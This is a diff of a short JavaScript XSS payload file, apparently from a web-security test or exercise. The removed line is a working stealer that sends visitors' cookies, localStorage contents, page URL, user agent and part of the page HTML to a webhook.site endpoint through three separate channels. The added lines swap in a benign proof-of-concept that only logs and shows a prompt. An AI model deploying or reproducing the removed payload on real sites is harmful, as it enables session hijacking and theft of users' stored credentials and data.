@@ -1,1 +1,8 @@
-fetch("https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c?type=fetch&cookies="+encodeURIComponent(document.cookie)).catch(e=>{});new Image().src=`https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c?type=img&url=${encodeURIComponent(window.location.href)}`;navigator.sendBeacon("https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c",JSON.stringify({c:document.cookie,ua:navigator.userAgent,ls:JSON.stringify(localStorage)}));const d={p:{u:window.location.href,h:document.documentElement.innerHTML.slice(0,500)},c:document.cookie,ls:JSON.stringify(localStorage)};fetch("https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c",{method:"POST",body:JSON.stringify(d)});
+function xssPayload() {
+  const alertMsg = 'xss ' + document.location;
+  console.log(alertMsg);
+  window.prompt(alertMsg);
+}
+
+console.log('XSS payload executed');
+xssPayload();
